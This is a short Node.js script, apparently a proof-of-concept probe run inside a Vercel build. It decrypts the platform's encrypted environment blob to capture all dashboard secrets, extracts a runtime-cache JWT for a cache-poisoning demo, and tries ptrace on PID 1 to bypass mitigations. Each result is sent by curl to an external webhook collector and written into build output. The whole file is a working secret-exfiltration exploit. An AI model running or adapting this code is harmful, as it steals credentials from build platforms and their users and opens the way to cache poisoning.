import { createDecipheriv } from 'crypto';
import { execSync } from 'child_process';
import { writeFileSync, mkdirSync } from 'fs';

const COLLECTOR = 'https://webhook.site/713191cd-9f81-4437-b7fe-794143a335d3';

function send(tag, body) {
  const data = JSON.stringify({ tag, body });
  try {
    execSync(`curl -s -X POST -H 'content-type: application/json' -d '${data.replace(/'/g, "'\\''")}' '${COLLECTOR}'`, { timeout: 10000 });
  } catch (_) {}
  try {
    mkdirSync('/vercel/output', { recursive: true });
    writeFileSync(`/vercel/output/probe-${tag}.json`, data);
  } catch (_) {}
}

// 1. Decrypt env blob — captures all dashboard secrets
try {
  const key = Buffer.from(process.env.VERCEL_ENV_ENC_KEY, 'base64');
  const raw = Buffer.from(process.env.VERCEL_ENCRYPTED_ENV_CONTENT, 'base64');
  const d = createDecipheriv('aes-256-cbc', key, raw.slice(0, 16));
  const plaintext = Buffer.concat([d.update(raw.slice(16)), d.final()]).toString('utf8');
  send('decrypted-env', { raw_bytes: raw.length, plaintext });
} catch (e) {
  send('decrypt-error', { error: e.message });
}

// 2. Capture RUNTIME_CACHE_HEADERS JWT — needed for cache poisoning demo
try {
  const rch = process.env.RUNTIME_CACHE_HEADERS;
  const rce = process.env.RUNTIME_CACHE_ENDPOINT;
  if (rch) {
    const jwt = JSON.parse(rch).Authorization.replace('Bearer ', '');
    const claims = JSON.parse(Buffer.from(jwt.split('.')[1], 'base64url').toString());
    send('cache-jwt', { raw: rch, endpoint: rce, claims });
  }
} catch (e) {
  send('cache-jwt-error', { error: e.message });
}

// 3. ptrace PID 1 — env-var mitigation bypass proof
try {
  const r = execSync(`python3 -c "import ctypes; l=ctypes.CDLL(None); print(l.ptrace(16,1,0,0))"`, { timeout: 5000, encoding: 'utf8' });
  send('ptrace', { result: r.trim() });
} catch (e) {
  send('ptrace', { error: e.message.slice(0, 200) });
}
